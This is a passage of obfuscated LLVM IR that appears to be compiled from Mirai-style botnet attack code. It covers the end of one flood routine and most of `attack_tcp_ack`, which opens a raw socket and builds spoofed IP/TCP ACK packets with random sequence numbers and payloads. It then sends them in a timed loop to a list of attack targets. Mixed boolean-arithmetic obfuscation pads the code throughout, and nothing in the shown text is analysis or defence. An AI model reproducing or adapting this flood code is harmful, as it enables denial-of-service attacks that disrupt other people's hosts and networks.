  %575 = call i32 @rand_next()
  %576 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %577 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %576, i32 0, i32 3
  store i32 %575, i32* %577, align 4
  br label %578

; <label>:578:                                    ; preds = %574, %571
  %579 = load i8, i8* %22, align 1
  %580 = icmp ne i8 %579, 0
  br i1 %580, label %581, label %594

; <label>:581:                                    ; preds = %578
  %582 = call i32 @rand_next()
  %583 = xor i32 %582, -1
  %584 = xor i32 65535, -1
  %585 = xor i32 1253731509, -1
  %586 = or i32 %583, %584
  %587 = or i32 1253731509, %585
  %588 = xor i32 %586, -1
  %589 = and i32 %588, %587
  %590 = and i32 %582, 65535
  %591 = trunc i32 %589 to i16
  %592 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %593 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %592, i32 0, i32 7
  store i16 %591, i16* %593, align 2
  br label %594

; <label>:594:                                    ; preds = %581, %578
  %595 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %596 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %595, i32 0, i32 7
  store i16 0, i16* %596, align 2
  %597 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %598 = bitcast %struct.iphdr* %597 to i16*
  %599 = call zeroext i16 @checksum_generic(i16* %598, i32 20)
  %600 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %601 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %600, i32 0, i32 7
  store i16 %599, i16* %601, align 2
  %602 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %603 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %602, i32 0, i32 6
  store i16 0, i16* %603, align 4
  %604 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %605 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %606 = bitcast %struct.tcphdr* %605 to i8*
  %607 = call zeroext i16 @htons(i16 zeroext 40) #7
  %608 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %604, i8* %606, i16 zeroext %607, i32 40)
  %609 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %610 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %609, i32 0, i32 6
  store i16 %608, i16* %610, align 4
  %611 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %612 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %611, i32 0, i32 1
  %613 = load i16, i16* %612, align 2
  %614 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %615 = load i32, i32* %11, align 4
  %616 = sext i32 %615 to i64
  %617 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %614, i64 %616
  %618 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %617, i32 0, i32 0
  %619 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %618, i32 0, i32 1
  store i16 %613, i16* %619, align 2
  %620 = load i32, i32* %12, align 4
  %621 = load i8*, i8** %33, align 8
  %622 = bitcast %union.__CONST_SOCKADDR_ARG* %36 to %struct.sockaddr**
  %623 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %624 = load i32, i32* %11, align 4
  %625 = sext i32 %624 to i64
  %626 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %623, i64 %625
  %627 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %626, i32 0, i32 0
  %628 = bitcast %struct.sockaddr_in* %627 to %struct.sockaddr*
  store %struct.sockaddr* %628, %struct.sockaddr** %622, align 8
  %629 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %36, i32 0, i32 0
  %630 = load %struct.sockaddr*, %struct.sockaddr** %629, align 8
  %631 = call i64 @sendto(i32 %620, i8* %621, i64 60, i32 16384, %struct.sockaddr* %630, i32 16)
  br label %632

; <label>:632:                                    ; preds = %594
  %633 = load i32, i32* %11, align 4
  %634 = add i32 %633, 1035981743
  %635 = add i32 %634, 1
  %636 = sub i32 %635, 1035981743
  %637 = add nsw i32 %633, 1
  store i32 %636, i32* %11, align 4
  br label %462

; <label>:638:                                    ; preds = %462
  %639 = call i64 @time(i64* null) #6
  %640 = load i32, i32* %29, align 4
  %641 = sext i32 %640 to i64
  %642 = icmp sgt i64 %639, %641
  br i1 %642, label %643, label %644

; <label>:643:                                    ; preds = %638
  br label %645

; <label>:644:                                    ; preds = %638
  br label %461

; <label>:645:                                    ; preds = %643, %115, %109
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_tcp_ack(i32, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_target*, align 8
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_option*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i8**, align 8
  %14 = alloca i8, align 1
  %15 = alloca i16, align 2
  %16 = alloca i8, align 1
  %17 = alloca i8, align 1
  %18 = alloca i16, align 2
  %19 = alloca i16, align 2
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i8, align 1
  %25 = alloca i8, align 1
  %26 = alloca i8, align 1
  %27 = alloca i8, align 1
  %28 = alloca i32, align 4
  %29 = alloca i8, align 1
  %30 = alloca i32, align 4
  %31 = alloca i32, align 4
  %32 = alloca %struct.iphdr*, align 8
  %33 = alloca %struct.tcphdr*, align 8
  %34 = alloca i8*, align 8
  %35 = alloca i8*, align 8
  %36 = alloca %struct.iphdr*, align 8
  %37 = alloca %struct.tcphdr*, align 8
  %38 = alloca i8*, align 8
  %39 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i32 %0, i32* %6, align 4
  store i8 %1, i8* %7, align 1
  store %struct.attack_target* %2, %struct.attack_target** %8, align 8
  store i8 %3, i8* %9, align 1
  store %struct.attack_option* %4, %struct.attack_option** %10, align 8
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %40 = load i8, i8* %7, align 1
  %41 = zext i8 %40 to i64
  %42 = call noalias i8* @calloc(i64 %41, i64 8) #6
  %43 = bitcast i8* %42 to i8**
  store i8** %43, i8*** %13, align 8
  %44 = load i8, i8* %9, align 1
  %45 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %46 = call i32 @attack_get_opt_int(i8 zeroext %44, %struct.attack_option* %45, i8 zeroext 2, i32 0)
  %47 = trunc i32 %46 to i8
  store i8 %47, i8* %14, align 1
  %48 = load i8, i8* %9, align 1
  %49 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %50 = call i32 @attack_get_opt_int(i8 zeroext %48, %struct.attack_option* %49, i8 zeroext 3, i32 65535)
  %51 = trunc i32 %50 to i16
  store i16 %51, i16* %15, align 2
  %52 = load i8, i8* %9, align 1
  %53 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %54 = call i32 @attack_get_opt_int(i8 zeroext %52, %struct.attack_option* %53, i8 zeroext 4, i32 64)
  %55 = trunc i32 %54 to i8
  store i8 %55, i8* %16, align 1
  %56 = load i8, i8* %9, align 1
  %57 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %58 = call i32 @attack_get_opt_int(i8 zeroext %56, %struct.attack_option* %57, i8 zeroext 5, i32 0)
  %59 = trunc i32 %58 to i8
  store i8 %59, i8* %17, align 1
  %60 = load i8, i8* %9, align 1
  %61 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %62 = call i32 @attack_get_opt_int(i8 zeroext %60, %struct.attack_option* %61, i8 zeroext 6, i32 65535)
  %63 = trunc i32 %62 to i16
  store i16 %63, i16* %18, align 2
  %64 = load i8, i8* %9, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %66 = call i32 @attack_get_opt_int(i8 zeroext %64, %struct.attack_option* %65, i8 zeroext 7, i32 65535)
  %67 = trunc i32 %66 to i16
  store i16 %67, i16* %19, align 2
  %68 = load i8, i8* %9, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 16, i32 65535)
  store i32 %70, i32* %20, align 4
  %71 = load i8, i8* %9, align 1
  %72 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %73 = call i32 @attack_get_opt_int(i8 zeroext %71, %struct.attack_option* %72, i8 zeroext 17, i32 65535)
  store i32 %73, i32* %21, align 4
  %74 = load i8, i8* %9, align 1
  %75 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %76 = call i32 @attack_get_opt_int(i8 zeroext %74, %struct.attack_option* %75, i8 zeroext 10, i32 0)
  %77 = trunc i32 %76 to i8
  store i8 %77, i8* %22, align 1
  %78 = load i8, i8* %9, align 1
  %79 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %80 = call i32 @attack_get_opt_int(i8 zeroext %78, %struct.attack_option* %79, i8 zeroext 11, i32 1)
  %81 = trunc i32 %80 to i8
  store i8 %81, i8* %23, align 1
  %82 = load i8, i8* %9, align 1
  %83 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %84 = call i32 @attack_get_opt_int(i8 zeroext %82, %struct.attack_option* %83, i8 zeroext 12, i32 0)
  %85 = trunc i32 %84 to i8
  store i8 %85, i8* %24, align 1
  %86 = load i8, i8* %9, align 1
  %87 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %88 = call i32 @attack_get_opt_int(i8 zeroext %86, %struct.attack_option* %87, i8 zeroext 13, i32 0)
  %89 = trunc i32 %88 to i8
  store i8 %89, i8* %25, align 1
  %90 = load i8, i8* %9, align 1
  %91 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %92 = call i32 @attack_get_opt_int(i8 zeroext %90, %struct.attack_option* %91, i8 zeroext 14, i32 0)
  %93 = trunc i32 %92 to i8
  store i8 %93, i8* %26, align 1
  %94 = load i8, i8* %9, align 1
  %95 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %96 = call i32 @attack_get_opt_int(i8 zeroext %94, %struct.attack_option* %95, i8 zeroext 15, i32 0)
  %97 = trunc i32 %96 to i8
  store i8 %97, i8* %27, align 1
  %98 = load i8, i8* %9, align 1
  %99 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %100 = call i32 @attack_get_opt_int(i8 zeroext %98, %struct.attack_option* %99, i8 zeroext 0, i32 512)
  store i32 %100, i32* %28, align 4
  %101 = load i8, i8* %9, align 1
  %102 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %103 = call i32 @attack_get_opt_int(i8 zeroext %101, %struct.attack_option* %102, i8 zeroext 1, i32 1)
  %104 = trunc i32 %103 to i8
  store i8 %104, i8* %29, align 1
  %105 = load i8, i8* %9, align 1
  %106 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %107 = load i32, i32* @LOCAL_ADDR, align 4
  %108 = call i32 @attack_get_opt_ip(i8 zeroext %105, %struct.attack_option* %106, i8 zeroext 24, i32 %107)
  store i32 %108, i32* %30, align 4
  %109 = call i64 @time(i64* null) #6
  %110 = load i32, i32* %6, align 4
  %111 = sext i32 %110 to i64
  %112 = sub i64 0, %109
  %113 = sub i64 0, %111
  %114 = add i64 %112, %113
  %115 = sub i64 0, %114
  %116 = add nsw i64 %109, %111
  %117 = trunc i64 %115 to i32
  store i32 %117, i32* %31, align 4
  %118 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %118, i32* %12, align 4
  %119 = icmp eq i32 %118, -1
  br i1 %119, label %120, label %121

; <label>:120:                                    ; preds = %5
  br label %700

; <label>:121:                                    ; preds = %5
  store i32 1, i32* %11, align 4
  %122 = load i32, i32* %12, align 4
  %123 = bitcast i32* %11 to i8*
  %124 = call i32 @setsockopt(i32 %122, i32 0, i32 3, i8* %123, i32 4) #6
  %125 = icmp eq i32 %124, -1
  br i1 %125, label %126, label %129

; <label>:126:                                    ; preds = %121
  %127 = load i32, i32* %12, align 4
  %128 = call i32 @close(i32 %127)
  br label %700

; <label>:129:                                    ; preds = %121
  store i32 0, i32* %11, align 4
  br label %130

; <label>:130:                                    ; preds = %493, %129
  %131 = load i32, i32* %11, align 4
  %132 = load i8, i8* %7, align 1
  %133 = zext i8 %132 to i32
  %134 = icmp slt i32 %131, %133
  br i1 %134, label %135, label %499

; <label>:135:                                    ; preds = %130
  %136 = call noalias i8* @calloc(i64 1510, i64 1) #6
  %137 = load i8**, i8*** %13, align 8
  %138 = load i32, i32* %11, align 4
  %139 = sext i32 %138 to i64
  %140 = getelementptr inbounds i8*, i8** %137, i64 %139
  store i8* %136, i8** %140, align 8
  %141 = load i8**, i8*** %13, align 8
  %142 = load i32, i32* %11, align 4
  %143 = sext i32 %142 to i64
  %144 = getelementptr inbounds i8*, i8** %141, i64 %143
  %145 = load i8*, i8** %144, align 8
  %146 = bitcast i8* %145 to %struct.iphdr*
  store %struct.iphdr* %146, %struct.iphdr** %32, align 8
  %147 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %148 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %147, i64 1
  %149 = bitcast %struct.iphdr* %148 to %struct.tcphdr*
  store %struct.tcphdr* %149, %struct.tcphdr** %33, align 8
  %150 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %151 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %150, i64 1
  %152 = bitcast %struct.tcphdr* %151 to i8*
  store i8* %152, i8** %34, align 8
  %153 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %154 = bitcast %struct.iphdr* %153 to i8*
  %155 = load i8, i8* %154, align 4
  %156 = xor i8 15, -1
  %157 = xor i8 %155, %156
  %158 = and i8 %157, %155
  %159 = and i8 %155, 15
  %160 = xor i8 %158, -1
  %161 = xor i8 64, -1
  %162 = xor i8 116, -1
  %163 = and i8 %160, 116
  %164 = and i8 %158, %162
  %165 = and i8 %161, 116
  %166 = and i8 64, %162
  %167 = or i8 %163, %164
  %168 = or i8 %165, %166
  %169 = xor i8 %167, %168
  %170 = or i8 %160, %161
  %171 = xor i8 %170, -1
  %172 = or i8 116, %162
  %173 = and i8 %171, %172
  %174 = or i8 %169, %173
  %175 = or i8 %158, 64
  store i8 %174, i8* %154, align 4
  %176 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %177 = bitcast %struct.iphdr* %176 to i8*
  %178 = load i8, i8* %177, align 4
  %179 = xor i8 -16, -1
  %180 = xor i8 %178, %179
  %181 = and i8 %180, %178
  %182 = and i8 %178, -16
  %183 = and i8 %181, 5
  %184 = xor i8 %181, 5
  %185 = or i8 %183, %184
  %186 = or i8 %181, 5
  store i8 %185, i8* %177, align 4
  %187 = load i8, i8* %14, align 1
  %188 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %189 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %188, i32 0, i32 1
  store i8 %187, i8* %189, align 1
  %190 = load i32, i32* %28, align 4
  %191 = sext i32 %190 to i64
  %192 = sub i64 40, -5977595697725562144
  %193 = add i64 %192, %191
  %194 = add i64 %193, -5977595697725562144
  %195 = add i64 40, %191
  %196 = trunc i64 %194 to i16
  %197 = call zeroext i16 @htons(i16 zeroext %196) #7
  %198 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %199 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %198, i32 0, i32 2
  store i16 %197, i16* %199, align 2
  %200 = load i16, i16* %15, align 2
  %201 = call zeroext i16 @htons(i16 zeroext %200) #7
  %202 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %203 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %202, i32 0, i32 3
  store i16 %201, i16* %203, align 4
  %204 = load i8, i8* %16, align 1
  %205 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %206 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %205, i32 0, i32 5
  store i8 %204, i8* %206, align 4
  %207 = load i8, i8* %17, align 1
  %208 = icmp ne i8 %207, 0
  br i1 %208, label %209, label %213

; <label>:209:                                    ; preds = %135
  %210 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %211 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %212 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %211, i32 0, i32 4
  store i16 %210, i16* %212, align 2
  br label %213

; <label>:213:                                    ; preds = %209, %135
  %214 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %215 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %214, i32 0, i32 6
  store i8 6, i8* %215, align 1
  %216 = load i32, i32* %30, align 4
  %217 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %218 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %217, i32 0, i32 8
  store i32 %216, i32* %218, align 4
  %219 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %220 = load i32, i32* %11, align 4
  %221 = sext i32 %220 to i64
  %222 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %219, i64 %221
  %223 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %222, i32 0, i32 1
  %224 = load i32, i32* %223, align 4
  %225 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %226 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %225, i32 0, i32 9
  store i32 %224, i32* %226, align 4
  %227 = load i16, i16* %18, align 2
  %228 = call zeroext i16 @htons(i16 zeroext %227) #7
  %229 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %230 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %229, i32 0, i32 0
  store i16 %228, i16* %230, align 4
  %231 = load i16, i16* %19, align 2
  %232 = call zeroext i16 @htons(i16 zeroext %231) #7
  %233 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %234 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %233, i32 0, i32 1
  store i16 %232, i16* %234, align 2
  %235 = load i32, i32* %20, align 4
  %236 = trunc i32 %235 to i16
  %237 = call zeroext i16 @htons(i16 zeroext %236) #7
  %238 = zext i16 %237 to i32
  %239 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %240 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %239, i32 0, i32 2
  store i32 %238, i32* %240, align 4
  %241 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %242 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %241, i32 0, i32 4
  %243 = load i16, i16* %242, align 4
  %244 = xor i16 %243, -1
  %245 = xor i16 -241, -1
  %246 = xor i16 32636, -1
  %247 = or i16 %244, %245
  %248 = or i16 32636, %246
  %249 = xor i16 %247, -1
  %250 = and i16 %249, %248
  %251 = and i16 %243, -241
  %252 = xor i16 %250, -1
  %253 = xor i16 80, -1
  %254 = xor i16 17110, -1
  %255 = and i16 %252, 17110
  %256 = and i16 %250, %254
  %257 = and i16 %253, 17110
  %258 = and i16 80, %254
  %259 = or i16 %255, %256
  %260 = or i16 %257, %258
  %261 = xor i16 %259, %260
  %262 = or i16 %252, %253
  %263 = xor i16 %262, -1
  %264 = or i16 17110, %254
  %265 = and i16 %263, %264
  %266 = or i16 %261, %265
  %267 = or i16 %250, 80
  store i16 %266, i16* %242, align 4
  %268 = load i8, i8* %22, align 1
  %269 = sext i8 %268 to i16
  %270 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %271 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %270, i32 0, i32 4
  %272 = load i16, i16* %271, align 4
  %273 = xor i16 1, -1
  %274 = xor i16 %269, %273
  %275 = and i16 %274, %269
  %276 = and i16 %269, 1
  %277 = shl i16 %275, 13
  %278 = xor i16 %272, -1
  %279 = xor i16 -8193, -1
  %280 = xor i16 -13836, -1
  %281 = or i16 %278, %279
  %282 = or i16 -13836, %280
  %283 = xor i16 %281, -1
  %284 = and i16 %283, %282
  %285 = and i16 %272, -8193
  %286 = xor i16 %284, -1
  %287 = xor i16 %277, -1
  %288 = xor i16 1920, -1
  %289 = and i16 %286, 1920
  %290 = and i16 %284, %288
  %291 = and i16 %287, 1920
  %292 = and i16 %277, %288
  %293 = or i16 %289, %290
  %294 = or i16 %291, %292
  %295 = xor i16 %293, %294
  %296 = or i16 %286, %287
  %297 = xor i16 %296, -1
  %298 = or i16 1920, %288
  %299 = and i16 %297, %298
  %300 = or i16 %295, %299
  %301 = or i16 %284, %277
  store i16 %300, i16* %271, align 4
  %302 = load i8, i8* %23, align 1
  %303 = sext i8 %302 to i16
  %304 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %305 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %304, i32 0, i32 4
  %306 = load i16, i16* %305, align 4
  %307 = xor i16 1, -1
  %308 = xor i16 %303, %307
  %309 = and i16 %308, %303
  %310 = and i16 %303, 1
  %311 = shl i16 %309, 12
  %312 = xor i16 %306, -1
  %313 = xor i16 -4097, -1
  %314 = xor i16 -19010, -1
  %315 = or i16 %312, %313
  %316 = or i16 -19010, %314
  %317 = xor i16 %315, -1
  %318 = and i16 %317, %316
  %319 = and i16 %306, -4097
  %320 = and i16 %318, %311
  %321 = xor i16 %318, %311
  %322 = or i16 %320, %321
  %323 = or i16 %318, %311
  store i16 %322, i16* %305, align 4
  %324 = load i8, i8* %24, align 1
  %325 = sext i8 %324 to i16
  %326 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %327 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %326, i32 0, i32 4
  %328 = load i16, i16* %327, align 4
  %329 = xor i16 %325, -1
  %330 = xor i16 1, -1
  %331 = xor i16 -31206, -1
  %332 = or i16 %329, %330
  %333 = or i16 -31206, %331
  %334 = xor i16 %332, -1
  %335 = and i16 %334, %333
  %336 = and i16 %325, 1
  %337 = shl i16 %335, 11
  %338 = xor i16 -2049, -1
  %339 = xor i16 %328, %338
  %340 = and i16 %339, %328
  %341 = and i16 %328, -2049
  %342 = and i16 %340, %337
  %343 = xor i16 %340, %337
  %344 = or i16 %342, %343
  %345 = or i16 %340, %337
  store i16 %344, i16* %327, align 4
  %346 = load i8, i8* %25, align 1
  %347 = sext i8 %346 to i16
  %348 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %349 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %348, i32 0, i32 4
  %350 = load i16, i16* %349, align 4
  %351 = xor i16 %347, -1
  %352 = xor i16 1, -1
  %353 = xor i16 -7974, -1
  %354 = or i16 %351, %352
  %355 = or i16 -7974, %353
  %356 = xor i16 %354, -1
  %357 = and i16 %356, %355
  %358 = and i16 %347, 1
  %359 = shl i16 %357, 10
  %360 = xor i16 %350, -1
  %361 = xor i16 -1025, -1
  %362 = xor i16 -2075, -1
  %363 = or i16 %360, %361
  %364 = or i16 -2075, %362
  %365 = xor i16 %363, -1
  %366 = and i16 %365, %364
  %367 = and i16 %350, -1025
  %368 = xor i16 %366, -1
  %369 = xor i16 %359, -1
  %370 = xor i16 4313, -1
  %371 = and i16 %368, 4313
  %372 = and i16 %366, %370
  %373 = and i16 %369, 4313
  %374 = and i16 %359, %370
  %375 = or i16 %371, %372
  %376 = or i16 %373, %374
  %377 = xor i16 %375, %376
  %378 = or i16 %368, %369
  %379 = xor i16 %378, -1
  %380 = or i16 4313, %370
  %381 = and i16 %379, %380
  %382 = or i16 %377, %381
  %383 = or i16 %366, %359
  store i16 %382, i16* %349, align 4
  %384 = load i8, i8* %26, align 1
  %385 = sext i8 %384 to i16
  %386 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %387 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %386, i32 0, i32 4
  %388 = load i16, i16* %387, align 4
  %389 = xor i16 %385, -1
  %390 = xor i16 1, -1
  %391 = xor i16 11966, -1
  %392 = or i16 %389, %390
  %393 = or i16 11966, %391
  %394 = xor i16 %392, -1
  %395 = and i16 %394, %393
  %396 = and i16 %385, 1
  %397 = shl i16 %395, 9
  %398 = xor i16 %388, -1
  %399 = xor i16 -513, -1
  %400 = xor i16 -31309, -1
  %401 = or i16 %398, %399
  %402 = or i16 -31309, %400
  %403 = xor i16 %401, -1
  %404 = and i16 %403, %402
  %405 = and i16 %388, -513
  %406 = xor i16 %404, -1
  %407 = xor i16 %397, -1
  %408 = xor i16 -26868, -1
  %409 = and i16 %406, -26868
  %410 = and i16 %404, %408
  %411 = and i16 %407, -26868
  %412 = and i16 %397, %408
  %413 = or i16 %409, %410
  %414 = or i16 %411, %412
  %415 = xor i16 %413, %414
  %416 = or i16 %406, %407
  %417 = xor i16 %416, -1
  %418 = or i16 -26868, %408
  %419 = and i16 %417, %418
  %420 = or i16 %415, %419
  %421 = or i16 %404, %397
  store i16 %420, i16* %387, align 4
  %422 = load i8, i8* %27, align 1
  %423 = sext i8 %422 to i16
  %424 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %425 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %424, i32 0, i32 4
  %426 = load i16, i16* %425, align 4
  %427 = xor i16 1, -1
  %428 = xor i16 %423, %427
  %429 = and i16 %428, %423
  %430 = and i16 %423, 1
  %431 = shl i16 %429, 8
  %432 = xor i16 -257, -1
  %433 = xor i16 %426, %432
  %434 = and i16 %433, %426
  %435 = and i16 %426, -257
  %436 = xor i16 %434, -1
  %437 = xor i16 %431, -1
  %438 = xor i16 -19086, -1
  %439 = and i16 %436, -19086
  %440 = and i16 %434, %438
  %441 = and i16 %437, -19086
  %442 = and i16 %431, %438
  %443 = or i16 %439, %440
  %444 = or i16 %441, %442
  %445 = xor i16 %443, %444
  %446 = or i16 %436, %437
  %447 = xor i16 %446, -1
  %448 = or i16 -19086, %438
  %449 = and i16 %447, %448
  %450 = or i16 %445, %449
  %451 = or i16 %434, %431
  store i16 %450, i16* %425, align 4
  %452 = call i32 @rand_next()
  %453 = xor i32 65535, -1
  %454 = xor i32 %452, %453
  %455 = and i32 %454, %452
  %456 = and i32 %452, 65535
  %457 = trunc i32 %455 to i16
  %458 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %459 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %458, i32 0, i32 5
  store i16 %457, i16* %459, align 2
  %460 = load i8, i8* %24, align 1
  %461 = icmp ne i8 %460, 0
  br i1 %461, label %462, label %486

; <label>:462:                                    ; preds = %213
  %463 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %464 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %463, i32 0, i32 4
  %465 = load i16, i16* %464, align 4
  %466 = xor i16 -2049, -1
  %467 = xor i16 %465, %466
  %468 = and i16 %467, %465
  %469 = and i16 %465, -2049
  %470 = xor i16 %468, -1
  %471 = xor i16 2048, -1
  %472 = xor i16 15412, -1
  %473 = and i16 %470, 15412
  %474 = and i16 %468, %472
  %475 = and i16 %471, 15412
  %476 = and i16 2048, %472
  %477 = or i16 %473, %474
  %478 = or i16 %475, %476
  %479 = xor i16 %477, %478
  %480 = or i16 %470, %471
  %481 = xor i16 %480, -1
  %482 = or i16 15412, %472
  %483 = and i16 %481, %482
  %484 = or i16 %479, %483
  %485 = or i16 %468, 2048
  store i16 %484, i16* %464, align 4
  br label %486

; <label>:486:                                    ; preds = %462, %213
  %487 = load i8*, i8** %34, align 8
  %488 = load i32, i32* %28, align 4
  call void @rand_alphastr(i8* %487, i32 %488)
  %489 = load i8*, i8** %34, align 8
  %490 = load i32, i32* %28, align 4
  %491 = sext i32 %490 to i64
  %492 = getelementptr inbounds i8, i8* %489, i64 %491
  store i8 0, i8* %492, align 1
  br label %493

; <label>:493:                                    ; preds = %486
  %494 = load i32, i32* %11, align 4
  %495 = sub i32 %494, -1880200493
  %496 = add i32 %495, 1
  %497 = add i32 %496, -1880200493
  %498 = add nsw i32 %494, 1
  store i32 %497, i32* %11, align 4
  br label %130

; <label>:499:                                    ; preds = %130
  br label %500

; <label>:500:                                    ; preds = %699, %499
  store i32 0, i32* %11, align 4
  br label %501

; <label>:501:                                    ; preds = %688, %500
  %502 = load i32, i32* %11, align 4
  %503 = load i8, i8* %7, align 1
  %504 = zext i8 %503 to i32
  %505 = icmp slt i32 %502, %504
  br i1 %505, label %506, label %693

; <label>:506:                                    ; preds = %501
  %507 = load i8**, i8*** %13, align 8
  %508 = load i32, i32* %11, align 4
  %509 = sext i32 %508 to i64
  %510 = getelementptr inbounds i8*, i8** %507, i64 %509
  %511 = load i8*, i8** %510, align 8
  store i8* %511, i8** %35, align 8
  %512 = load i8*, i8** %35, align 8
  %513 = bitcast i8* %512 to %struct.iphdr*
  store %struct.iphdr* %513, %struct.iphdr** %36, align 8
  %514 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %515 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %514, i64 1
  %516 = bitcast %struct.iphdr* %515 to %struct.tcphdr*
  store %struct.tcphdr* %516, %struct.tcphdr** %37, align 8
  %517 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %518 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %517, i64 1
  %519 = bitcast %struct.tcphdr* %518 to i8*
  store i8* %519, i8** %38, align 8
  %520 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %521 = load i32, i32* %11, align 4
  %522 = sext i32 %521 to i64
  %523 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %520, i64 %522
  %524 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %523, i32 0, i32 2
  %525 = load i8, i8* %524, align 4
  %526 = zext i8 %525 to i32
  %527 = icmp slt i32 %526, 32
  br i1 %527, label %528, label %552

; <label>:528:                                    ; preds = %506
